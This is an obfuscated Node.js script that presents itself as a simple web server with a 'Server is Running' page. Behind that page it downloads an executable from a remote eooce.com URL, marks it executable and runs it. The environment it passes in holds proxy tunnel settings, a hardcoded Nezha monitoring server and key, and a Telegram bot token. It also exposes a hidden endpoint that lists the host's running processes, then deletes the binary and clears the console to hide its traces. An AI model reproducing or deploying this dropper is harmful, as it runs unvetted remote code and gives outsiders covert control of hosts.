#!/usr/bin/env node

const _0x108fb3 = _0x411c
;(function (_0x443bf3, _0x3d8ad5) {
  const _0x134e6d = { _0x2f5901: 0x153, _0x302e6b: 0x129, _0x4cec5a: 0x14d },
    _0x14e9ff = _0x411c,
    _0x3ad0d0 = _0x443bf3()
  while (!![]) {
    try {
      const _0x2ed447 =
        -parseInt(_0x14e9ff(_0x134e6d._0x2f5901)) / 0x1 +
        -parseInt(_0x14e9ff(0x156)) / 0x2 +
        parseInt(_0x14e9ff(0x149)) / 0x3 +
        -parseInt(_0x14e9ff(_0x134e6d._0x302e6b)) / 0x4 +
        (-parseInt(_0x14e9ff(0x11c)) / 0x5) * (-parseInt(_0x14e9ff(0x110)) / 0x6) +
        parseInt(_0x14e9ff(_0x134e6d._0x4cec5a)) / 0x7 +
        (parseInt(_0x14e9ff(0x117)) / 0x8) * (parseInt(_0x14e9ff(0x13f)) / 0x9)
      if (_0x2ed447 === _0x3d8ad5) break
      else _0x3ad0d0['push'](_0x3ad0d0['shift']())
    } catch (_0x325f94) {
      _0x3ad0d0['push'](_0x3ad0d0['shift']())
    }
  }
})(_0x1d0a, 0xd0cab)
const fs = require('fs'),
  os = require('os'),
  path = require('path'),
  https = require(_0x108fb3(0x11f)),
  http = require('http')
process[_0x108fb3(0xf8)] = !![]
const { spawn, execSync } = require(_0x108fb3(0x13b)),
  PORT = process[_0x108fb3(0x119)][_0x108fb3(0x14c)] || 0xbb8,
  SUB_PATH = process[_0x108fb3(0x119)][_0x108fb3(0x13c)] || _0x108fb3(0x141),
  config = {
    NAME: process[_0x108fb3(0x119)]['NAME'] || _0x108fb3(0x116),
    CFIP: process[_0x108fb3(0x119)][_0x108fb3(0xfe)] || _0x108fb3(0x14a),
    CFPORT: process[_0x108fb3(0x119)]['CFPORT'] || 0x1bb,
    UPLOAD_URL: process[_0x108fb3(0x119)][_0x108fb3(0x120)] || '',
    FILE_PATH: process[_0x108fb3(0x119)][_0x108fb3(0x151)] || _0x108fb3(0x155),
    NEZHA_SERVER: process[_0x108fb3(0x119)][_0x108fb3(0x138)] || _0x108fb3(0xf7),
    NEZHA_PORT: process[_0x108fb3(0x119)]['NEZHA_PORT'] || '',
    NEZHA_KEY: process['env'][_0x108fb3(0x128)] || _0x108fb3(0xfc),
    DISABLE_ARGO: process['env']['DISABLE_ARGO'] || _0x108fb3(0x122),
    UUID: process[_0x108fb3(0x119)][_0x108fb3(0xfb)] || _0x108fb3(0x12f),
    ARGO_AUTH: process['env'][_0x108fb3(0x12c)] || '',
    ARGO_DOMAIN: process[_0x108fb3(0x119)][_0x108fb3(0x102)] || '',
    ARGO_PORT: process[_0x108fb3(0x119)][_0x108fb3(0x147)] || _0x108fb3(0x101),
    S5_PORT: process[_0x108fb3(0x119)][_0x108fb3(0x121)] || '',
    HY2_PORT: process['env'][_0x108fb3(0xff)] || '',
    TUIC_PORT: process[_0x108fb3(0x119)][_0x108fb3(0xf5)] || '',
    ANYTLS_PORT: process[_0x108fb3(0x119)]['ANYTLS_PORT'] || '',
    REALITY_PORT: process['env'][_0x108fb3(0x13e)] || '',
    ANYREALITY_PORT: process[_0x108fb3(0x119)][_0x108fb3(0xfd)] || '',
    CHAT_ID: process[_0x108fb3(0x119)]['CHAT_ID'] || _0x108fb3(0x145),
    BOT_TOKEN: process['env'][_0x108fb3(0x137)] || _0x108fb3(0x11b),
    SHOW_LOG: process[_0x108fb3(0x119)][_0x108fb3(0x134)] || 'false'
  }
function log(_0x2afead, _0x4323a4 = _0x108fb3(0x11d)) {
  const _0x3b1775 = { _0x4d3a02: 0x104 },
    _0x2df4db = _0x108fb3,
    _0x25f1cf = new Date()[_0x2df4db(0xf4)]()
  console[_0x2df4db(_0x3b1775._0x4d3a02)]('[' + _0x25f1cf + _0x2df4db(0x127) + _0x4323a4 + ']\x20' + _0x2afead)
}
function getArchitecture() {
  const _0x5e55d5 = { _0x2ee66d: 0x100, _0x2ede72: 0x123, _0xd6d666: 0x14b },
    _0xc7060f = _0x108fb3,
    _0x3e227f = os[_0xc7060f(0x126)](),
    _0x233939 = os[_0xc7060f(0x111)]()
  log(_0xc7060f(0x130) + _0x233939 + _0xc7060f(0x103) + _0x3e227f)
  if (_0x233939 === _0xc7060f(_0x5e55d5._0x2ee66d) || _0x233939 === 'darwin') {
    if (_0x3e227f === 'x64' || _0x3e227f === _0xc7060f(0x10b)) return 'amd64'
    else {
      if (_0x3e227f === 'arm64' || _0x3e227f === _0xc7060f(_0x5e55d5._0x2ede72)) return _0xc7060f(_0x5e55d5._0xd6d666)
    }
  }
  return (log(_0xc7060f(0x106), _0xc7060f(0x10e)), _0xc7060f(0x10b))
}
function downloadFile(_0x51a150, _0x1b862b) {
  const _0x2e5523 = { _0x51b3e2: 0x11a, _0x15bd8a: 0x118 }
  return new Promise((_0x2a8e83, _0x3c5d64) => {
    const _0x3364c7 = { _0x4e5a7f: 0x11e },
      _0x11246c = _0x411c,
      _0x2da567 = fs['createWriteStream'](_0x1b862b)
    https['get'](_0x51a150, (_0x2776e7) => {
      const _0x4d276c = _0x411c
      if (_0x2776e7[_0x4d276c(0x11a)] !== 0xc8) {
        _0x3c5d64(new Error('Download\x20failed,\x20status:\x20' + _0x2776e7[_0x4d276c(_0x2e5523._0x51b3e2)]))
        return
      }
      ;(_0x2776e7[_0x4d276c(_0x2e5523._0x15bd8a)](_0x2da567),
        _0x2da567['on']('finish', () => {
          const _0x5093fd = _0x4d276c
          ;(_0x2da567[_0x5093fd(_0x3364c7._0x4e5a7f)](), _0x2a8e83())
        }))
    })['on'](_0x11246c(0xf3), (_0x4a9512) => {
      const _0x2c5c78 = _0x11246c
      ;(fs[_0x2c5c78(0x13a)](_0x1b862b, () => {}), _0x3c5d64(_0x4a9512))
    })
  })
}
const server = http[_0x108fb3(0x154)](async (_0x5047fc, _0x534943) => {
  const _0x2e7a2b = {
      _0x2e10d3: 0x143,
      _0x4be8c2: 0x114,
      _0x1b39ba: 0x136,
      _0x10ac84: 0x133,
      _0x3d54b6: 0xfa,
      _0x2316be: 0x132,
      _0x4ce838: 0x136,
      _0x51aef4: 0xf9,
      _0x393ac7: 0x107
    },
    _0x216788 = _0x108fb3
  try {
    if (_0x5047fc[_0x216788(0x125)] === '/') {
      const _0x35a110 = path[_0x216788(_0x2e7a2b._0x2e10d3)](__dirname, _0x216788(0x10d))
      if (fs[_0x216788(0x150)](_0x35a110)) {
        const _0x5a04d4 = fs[_0x216788(_0x2e7a2b._0x4be8c2)](_0x35a110, 'utf8')
        ;(_0x534943[_0x216788(0x107)](0xc8, { 'Content-Type': _0x216788(0x131) }), _0x534943[_0x216788(_0x2e7a2b._0x1b39ba)](_0x5a04d4))
      } else
        (_0x534943[_0x216788(0x107)](0xc8, { 'Content-Type': _0x216788(0x131) }),
          _0x534943[_0x216788(_0x2e7a2b._0x1b39ba)](_0x216788(_0x2e7a2b._0x10ac84)))
    } else {
      if (_0x5047fc[_0x216788(0x125)] === '/' + SUB_PATH) {
        const _0x1c2726 = path['join'](config['FILE_PATH'], _0x216788(0x144))
        if (fs[_0x216788(0x150)](_0x1c2726)) {
          const _0x1ba621 = fs[_0x216788(0x114)](_0x1c2726, _0x216788(_0x2e7a2b._0x3d54b6))
          ;(_0x534943['writeHead'](0xc8, { 'Content-Type': _0x216788(_0x2e7a2b._0x2316be) }), _0x534943[_0x216788(0x136)](_0x1ba621))
        } else (_0x534943['writeHead'](0x194), _0x534943[_0x216788(0x136)](_0x216788(0x12b)))
      } else {
        if (_0x5047fc['url'] === '/ps')
          try {
            const _0x286b25 = execSync(_0x216788(0x152), { encoding: 'utf8', maxBuffer: 0x400 * 0x400 })
            ;(_0x534943['writeHead'](0xc8, { 'Content-Type': _0x216788(_0x2e7a2b._0x2316be) }), _0x534943[_0x216788(0x136)](_0x286b25))
          } catch (_0x64563d) {
            ;(_0x534943[_0x216788(0x107)](0x1f4),
              _0x534943[_0x216788(_0x2e7a2b._0x4ce838)](_0x216788(_0x2e7a2b._0x51aef4) + _0x64563d[_0x216788(0x108)]))
          }
        else (_0x534943[_0x216788(_0x2e7a2b._0x393ac7)](0x194), _0x534943[_0x216788(_0x2e7a2b._0x1b39ba)](_0x216788(0x14f)))
      }
    }
  } catch (_0x200a04) {
    ;(_0x534943[_0x216788(_0x2e7a2b._0x393ac7)](0x1f4), _0x534943[_0x216788(0x136)](_0x216788(0x105)))
  }
})
function _0x411c(_0x127a54, _0x5aba3d) {
  const _0x1d0a98 = _0x1d0a()
  return (
    (_0x411c = function (_0x411c8a, _0x2cfedb) {
      _0x411c8a = _0x411c8a - 0xf2
      let _0x464323 = _0x1d0a98[_0x411c8a]
      return _0x464323
    }),
    _0x411c(_0x127a54, _0x5aba3d)
  )
}
function _0x1d0a() {
  const _0x57e77f = [
    '1978030VGQKza',
    'DISABLE_ARGO',
    'error',
    'toLocaleTimeString',
    'TUIC_PORT',
    'CFPORT',
    'nezha.933993.xyz:443',
    'noDeprecation',
    'Error:\x20',
    'utf8',
    'UUID',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'ANYREALITY_PORT',
    'CFIP',
    'HY2_PORT',
    'linux',
    '58081',
    'ARGO_DOMAIN',
    ',\x20Arch:\x20',
    'log',
    'Internal\x20Server\x20Error',
    'Unknown\x20architecture,\x20defaulting\x20to\x20amd64',
    'writeHead',
    'message',
    'Process\x20error:\x20',
    'ERROR',
    'amd64',
    'Shutting\x20down...',
    'index.html',
    'WARN',
    'exit',
    '12yUXDlx',
    'platform',
    '✅\x20App\x20is\x20running',
    'clear',
    'readFileSync',
    'https://amd64.eooce.com/sbsh',
    'js-node',
    '807080GyGroM',
    'pipe',
    'env',
    'statusCode',
    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
    '3666040BISnNk',
    'INFO',
    'close',
    'https',
    'UPLOAD_URL',
    'S5_PORT',
    'true',
    'aarch64',
    'disbot',
    'url',
    'arch',
    ']\x20[',
    'NEZHA_KEY',
    '306312rujVtJ',
    'Starting\x20application...',
    'sub.txt\x20not\x20found\x20yet.',
    'ARGO_AUTH',
    '0.0.0.0',
    'chmodSync',
    '18df3378-491f-4083-8f06-13a8b40e39f5',
    'Platform:\x20',
    'text/html',
    'text/plain',
    '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Server\x20is\x20Running</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
    'SHOW_LOG',
    'listen',
    'end',
    'BOT_TOKEN',
    'NEZHA_SERVER',
    'NEZHA_PORT',
    'unlink',
    'child_process',
    'SUB_PATH',
    'kill',
    'REALITY_PORT',
    '27YPtxtm',
    'SIGINT',
    '800',
    'inherit',
    'join',
    'sub.txt',
    '7575949494',
    'CHAT_ID',
    'ARGO_PORT',
    'unlinkSync',
    '3074931uYxcrn',
    'mfa.gov.ua',
    'arm64',
    'PORT',
    '135975fiiBez',
    'cwd',
    '404\x20Not\x20Found',
    'existsSync',
    'FILE_PATH',
    'ps\x20aux',
    '892669ObKBzB',
    'createServer',
    '.npm'
  ]
  _0x1d0a = function () {
    return _0x57e77f
  }
  return _0x1d0a()
}
async function main() {
  const _0x1029ad = {
      _0x5229d3: 0x12a,
      _0x3ae384: 0x143,
      _0x190976: 0xfb,
      _0x5aad72: 0x102,
      _0x47cae3: 0x12c,
      _0x58025e: 0x151,
      _0x17ad0f: 0x147,
      _0x110d97: 0x121,
      _0x2acb73: 0xff,
      _0x280036: 0x146,
      _0x1ec6de: 0x140,
      _0x1ce8a4: 0xf9,
      _0x522f5d: 0x10a
    },
    _0x5cd43e = { _0x3898c0: 0x13d, _0x23f36b: 0x148 },
    _0x50eb87 = _0x108fb3
  log(_0x50eb87(_0x1029ad._0x5229d3))
  let _0x37f2ea = '',
    _0x2de288 = null
  try {
    fs['mkdirSync'](config['FILE_PATH'], { recursive: !![] })
    const _0x255715 = getArchitecture(),
      _0xab3c5b = _0x255715 === _0x50eb87(0x10b) ? _0x50eb87(0x115) : 'https://arm64.eooce.com/sbsh'
    ;((_0x37f2ea = path[_0x50eb87(_0x1029ad._0x3ae384)](process[_0x50eb87(0x14e)](), _0x50eb87(0x124))),
      await downloadFile(_0xab3c5b, _0x37f2ea),
      fs[_0x50eb87(0x12e)](_0x37f2ea, 0x1ed))
    const _0x12ca50 = {
      ...process[_0x50eb87(0x119)],
      UUID: config[_0x50eb87(_0x1029ad._0x190976)],
      NEZHA_SERVER: config[_0x50eb87(0x138)],
      NEZHA_PORT: config[_0x50eb87(0x139)],
      NEZHA_KEY: config[_0x50eb87(0x128)],
      ARGO_DOMAIN: config[_0x50eb87(_0x1029ad._0x5aad72)],
      ARGO_AUTH: config[_0x50eb87(_0x1029ad._0x47cae3)],
      CFIP: config['CFIP'],
      CFPORT: config[_0x50eb87(0xf6)],
      NAME: config['NAME'],
      FILE_PATH: config[_0x50eb87(_0x1029ad._0x58025e)],
      ARGO_PORT: config[_0x50eb87(_0x1029ad._0x17ad0f)],
      S5_PORT: config[_0x50eb87(_0x1029ad._0x110d97)],
      HY2_PORT: config[_0x50eb87(_0x1029ad._0x2acb73)],
      TUIC_PORT: config['TUIC_PORT'],
      ANYTLS_PORT: config['ANYTLS_PORT'],
      REALITY_PORT: config[_0x50eb87(0x13e)],
      ANYREALITY_PORT: config[_0x50eb87(0xfd)],
      CHAT_ID: config[_0x50eb87(_0x1029ad._0x280036)],
      BOT_TOKEN: config['BOT_TOKEN'],
      UPLOAD_URL: config['UPLOAD_URL'],
      DISABLE_ARGO: config[_0x50eb87(0xf2)]
    }
    ;((_0x2de288 = spawn(_0x37f2ea, [], { env: _0x12ca50, stdio: _0x50eb87(0x142) })),
      _0x2de288['on'](_0x50eb87(0xf3), (_0x5a2ae6) => {
        const _0x26161a = _0x50eb87
        log(_0x26161a(0x109) + _0x5a2ae6[_0x26161a(0x108)], _0x26161a(0x10a))
      }),
      _0x2de288['on']('exit', (_0x2faf16) => {
        const _0x3f0403 = { _0x3b785f: 0x150, _0x301f1e: 0x113 }
        ;(log('Logs\x20will\x20be\x20cleared\x20in\x2090\x20seconds,you\x20can\x20copy\x20the\x20above\x20nodes'),
          setTimeout(() => {
            const _0x17bca2 = _0x411c
            fs[_0x17bca2(_0x3f0403._0x3b785f)](_0x37f2ea) &&
              (fs[_0x17bca2(0x148)](_0x37f2ea), console[_0x17bca2(_0x3f0403._0x301f1e)](), log(_0x17bca2(0x112)))
          }, 0x15f90))
      }),
      log('🌐\x20HTTP:\x20http://localhost:' + PORT),
      process['on'](_0x50eb87(_0x1029ad._0x1ec6de), () => {
        const _0x22a5ea = _0x50eb87
        log(_0x22a5ea(0x10c))
        if (_0x2de288) _0x2de288[_0x22a5ea(_0x5cd43e._0x3898c0)]()
        if (fs['existsSync'](_0x37f2ea)) fs[_0x22a5ea(_0x5cd43e._0x23f36b)](_0x37f2ea)
        process[_0x22a5ea(0x10f)](0x0)
      }))
  } catch (_0x4b82d4) {
    ;(log(_0x50eb87(_0x1029ad._0x1ce8a4) + _0x4b82d4[_0x50eb87(0x108)], _0x50eb87(_0x1029ad._0x522f5d)),
      fs[_0x50eb87(0x150)](_0x37f2ea) && fs[_0x50eb87(0x148)](_0x37f2ea),
      process[_0x50eb87(0x10f)](0x1))
  }
}
;(server[_0x108fb3(0x135)](PORT, _0x108fb3(0x12d), () => {}), main())
